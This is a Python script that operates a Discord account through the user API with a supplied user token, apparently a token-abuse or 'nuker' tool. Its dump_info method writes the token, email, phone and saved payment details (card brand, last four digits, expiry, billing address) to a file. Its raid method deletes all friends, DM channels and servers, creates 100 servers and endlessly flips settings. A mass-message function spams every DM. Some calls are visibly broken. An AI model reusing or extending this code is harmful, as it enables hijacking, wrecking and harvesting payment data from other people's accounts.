from threading import Thread
from requests import Session
import random
import time
import json

TOKEN = ""


class Playground:
    def __init__(self, token):
        self.token = token
        self.session = Session()
        self.session.headers = {"authorization": self.token, "content-type": "application/json"}

        self.api = "https://discord.com/api"

        self.username = None
        self.id = None
        self.email = None
        self.phone = None

        self._check()

    def _check(self):
        url = self.api + "/users/@me"
        r = self.session.get(url)

        if r.status_code == 200:
            print(f"Valid token: {self.token}")
            data = r.json()
            self.username = data['username']
            self.id = data['id']
            self.email = data['email']
            self.phone = data['phone']
        else:
            print(f"Invalid token: {self.token}")
            exit()

    def get_gifts(self):
        url = self.api + "/users/@me/entitlements/gifts"
        r = self.session.get(url)
        return r.json() if r.status_code == 200 else []

    def get_user_channels(self):
        url = self.api + "/users/@me/channels"
        r = self.session.get(url)
        return r.json() if r.status_code == 200 else []

    def get_guilds(self):
        url = self.api + "/users/@me/guilds"
        r = self.session.get(url)
        return r.json() if r.status_code == 200 else []

    def get_friends(self):
        url = self.api + "/users/@me/relationships"
        r = self.session.get(url)
        return r.json() if r.status_code == 200 else []

    def get_nitro(self):
        url = self.api + f"/users/{self.id}/profile"
        r = self.session.get(url)
        try:
            return bool(r.json()['premium_since'])
        except KeyError('premium_since'):
            return False

    def join_server(self, invite_code):
        invite_code = invite_code.replace("https://discord.gg/", "")
        url = self.api + f"/invites/{invite_code}"
        r = self.session.post(url)
        if r.status_code in [200, 201, 204]:
            print(f"{self.username} | Joined to {invite_code}")
        else:
            print(f"{self.username} | Error {r.text}")

    def set_typing(self, channel_id, amount=1):
        url = self.api + f"/channels/{channel_id}/typing"
        for _ in range(amount):
            r = self.session.post(url, json={})
            if r.status_code in [200, 201, 204]:
                print(f"{self.username} | Sent typing request")
            else:
                print(f"{self.username} | Error {r.text}")

    def set_custom_status(self, status):
        url = self.api + "/users/@me/settings"
        payload = {"custom_status": {"text": status}}
        r = self.session.patch(url, json=payload)
        if r.status_code in [200, 201, 204]:
            print(f"{self.username} | Status changed to: {status}")
        else:
            print(f"{self.username} | Error: {r.text}")

    def set_bio(self, bio):
        url = self.api + "/users/@me"
        payload = {"bio": bio}
        r = self.session.patch(url, json=payload)
        if r.status_code in [200, 201, 204]:
            print(f"{self.username} | Bio changed to: {bio}")
        else:
            print(f"{self.username} | Error: {r.text}")

    def change_theme(self, theme):
        url = self.api + "/users/@me/settings"
        if theme in ["dark", "light"]:
            r = self.session.patch(url, json={"theme": theme})
            if r.status_code in [200, 201, 204]:
                print(f"{self.username} | Theme changed to {theme}")
            else:
                print(f"{self.username} | Error: {r.text}")
        else:
            print(f"Invalid theme type, maybe you meant: 'dark' or 'light'")

    def change_status(self, status):
        url = self.api + "/users/@me/settings"
        statuses = ["online", "idle", "dnd", "invisible"]
        if status in statuses:
            payload = {"status": status}
            r = self.session.patch(url, json=payload)
            if r.status_code in [200, 201, 204]:
                print(f"{self.username} | Status changed to {status}")
            else:
                print(f"{self.username} | Error: {r.text}")
        else:
            print(f"Invalid status, maybe you meant: {statuses}")

    def change_language(self, language):
        languages = ["da", "de", "en-GB", "en-US", "es-EN", "fr", "hr", "it", "lt", "hu",
                     "nl", "no", "pl", "pt-BR", "ro", "fi", "sv-SE", "vi", "tr", "cs",
                     "el", "bg", "ru", "uk", "hi", "th", "zh-CN", "ja", "zh-TW", "ko"]
        url = self.api + "/users/@me/settings"
        if language in languages:
            r = self.session.patch(url, json={"locale": language})
            if r.status_code in [200, 201, 204]:
                print(f"{self.username} | Language changed to {language}")
            else:
                print(f"{self.username} | Error: {r.text}")
        else:
            print(f"Invalid language, maybe you meant: {languages}")

    def send_message(self, msg, channel_id):
        url = self.api + f"/channels/{channel_id}/messages"
        data = {"content": msg}
        r = self.session.post(url, json=data)
        if r.status_code == 200:
            print(f"{self.username} | Message sent to {channel_id}")
        else:
            print(f"{self.username} | Error {r.status_code}: {channel_id}")

    def send_mass_messages(self, msg):
        total = 0
        for channel in self.get_user_channels():
            self.send_message(msg, channel['id'])
            total += 1
            time.sleep(1)
        print(f"{self.username} | Sent {total} messages")

    def create_threads(self, channel, name, duration: int):
        url = self.api + f"/channels/{channel}/threads"
        payload = {"name": name, "type": 11, "auto_archive_duration": duration}
        r = self.session.post(url, json=payload)
        if r.status_code in [200, 201, 204]:
            print(f"{self.username} | Created a thread at {channel}")
        else:
            print(f"{self.username} | Failed to create the thread at {channel}")

    def raid(self):
        Thread(target=self.create_guilds, args=["raided", 100]).start()
        Thread(target=self.delete_guilds).start()
        Thread(target=self.delete_friends).start()
        Thread(target=self.delete_channels).start()
        while True:
            languages = ["da", "de", "en-GB", "en-US", "es-EN", "fr", "hr", "it", "lt", "hu",
                         "nl", "no", "pl", "pt-BR", "ro", "fi", "sv-SE", "vi", "tr", "cs",
                         "el", "bg", "ru", "uk", "hi", "th", "zh-CN", "ja", "zh-TW", "ko"]
            self.change_language(random.choice(languages))
            for i in range(2):
                theme = "dark" if i == 0 else "light"
                self.change_theme(theme)

    def get_payments(self):
        payment_types = ["Credit Card", "Paypal"]
        url = self.api + "/users/@me/billing/payment-sources"
        r = self.session.get(url)
        if r.status_code in [200, 201, 204]:
            payments = []
            for data in r.json():
                if int(data['type'] == 1):
                    payments.append({'type': payment_types[int(data['type']) - 1],
                                     'valid': not data['invalid'],
                                     'brand': data['brand'],
                                     'last 4': data['last_4'],
                                     'expires': str(data['expires_year']) + "y " + str(data['expires_month']) + 'm',
                                     'billing name': data['billing_address']['name'],
                                     'country': data['billing_address']['country'],
                                     'state': data['billing_address']['state'],
                                     'city': data['billing_address']['city'],
                                     'zip code': data['billing_address']['postal_code'],
                                     'address': data['billing_address']['line_1'], })
                else:
                    payments.append({'type': payment_types[int(data['type']) - 1],
                                     'valid': not data['invalid'],
                                     'email': data['email'], 'billing name': data['billing_address']['name'],
                                     'country': data['billing_address']['country'],
                                     'state': data['billing_address']['state'],
                                     'city': data['billing_address']['city'],
                                     'zip code': data['billing_address']['postal_code'],
                                     'address': data['billing_address']['line_1'], })
            return payments
        else:
            return []

    def get_messages(self, channel_id, page: int = 0):
        offset = 25 * page
        url = self.api + f"/channels/{channel_id}/messages/search?offset={offset}"
        r = self.session.get(url)
        if r.status_code in [200, 201, 204]:
            return r.json()["messages"]
        else:
            return []

    def clear_messages(self, channel_id):
        # TODO: REDO
        pass
    #     total_messages_url = self.api + f"/channels/{channel_id}/messages/search?author_id={self.id}"
    #     total_messages = self.session.get(total_messages_url).json()["total_results"]
    #     page = 0
    #     total = 0
    #     while total <= total_messages:
    #         messages = self.get_messages(channel_id, page)
    #         for message in messages:
    #             if message[0]["author"]["id"] == self.id:
    #                 url = self.api + f"/channels/{channel_id}/messages/{message[0]['id']}"
    #                 r = self.session.delete(url)
    #                 print(r.status_code, r.text)
    #                 if r.status_code in [200, 201, 204]:
    #                     print(f"{self.username} | Deleted message {message[0]['id']}")
    #                     time.sleep(2)
    #                     total += 1
    #                 else:
    #                     print(r.status_code)
    #                     print(r.text)
    #         page += 1
    #     print(f"{self.username} | Deleted {total} messages in {channel_id}")

    def delete_friends(self):
        total = 0
        for friend in self.get_friends():
            url = self.api + f"/users/@me/relationships/{friend['id']}"
            r = self.session.delete(url)
            if r.status_code in [200, 201, 204]:
                total += 1
        print(f"{self.username} | Deleted {total} friends")

    def delete_guilds(self, exceptions):
        total = 0
        for guild in self.get_guilds():
            if guild["id"] in exceptions:
                continue
            if guild['owner']:
                url = self.api + f"/guilds/{guild['id']}/delete"
                r = self.session.post(url, json={})
                if r.status_code in [200, 201, 204]:
                    total += 1
            else:
                url = self.api + "/users/@me/guilds/{guild['id']}"
                self.session.delete(url, json={})
        print(f"{self.username} | Deleted {total} guilds")

    def delete_channels(self):
        total = 0
        for channel in self.get_user_channels():
            url = self.api + f"/channels/{channel['id']}"
            r = self.session.delete(url)
            if r.status_code in [200, 201, 204]:
                total += 1
        print(f"{self.username} | Deleted {total} channels")

    def create_guilds(self, name, amount: int):
        url = self.api + "/guilds"
        payload = {"name": name}
        total = 0
        for i in range(amount):
            r = self.session.post(url, json=payload)
            if r.status_code in [200, 201, 204]:
                total += 1
        print(f"{self.username} | created {total} servers")

    def dump_info(self, extra_info: bool = False):
        info = {
            "token": self.token,
            "username": self.username,
            "id": self.id,
            "email": self.email,
            "phone": self.phone,
            "nitro": self.get_nitro(),
            "gifts": self.get_gifts(),
            "payments": self.get_payments()
        }

        if extra_info:
            info["friends"] = self.get_friends(),
            info["user_dm"] = self.get_user_channels(),
            info["guilds"] = self.get_guilds()

        with open(f"{self.username}.json", "w") as f:
            json.dump(info, f, indent=4)
        print("Info dumped")


if __name__ == '__main__':
    user = Playground(TOKEN)
    # user.dump_info(extra_info=True)
    # user.set_typing(channel_id="Channel")
    # user.send_message(msg=":neutral_face:", channel_id="831933264649519136")
    # user.send_mass_messages(msg="Msg")
    # user.set_bio(bio="New Bio")
    # user.set_custom_status(status="New status")
    # user.change_status()
    # user.change_language(language="Lang")
    # user.change_theme(theme="dark")
    # user.create_threads(channel="Channel", name="Name", duration=1400)
    # user.create_guilds(name="UwU", amount=100)
    # user.clear_messages(channel_id="914598955545952328")
    # user.delete_guilds()
    # user.delete_channels()
    # user.delete_friends()
    # user.raid()
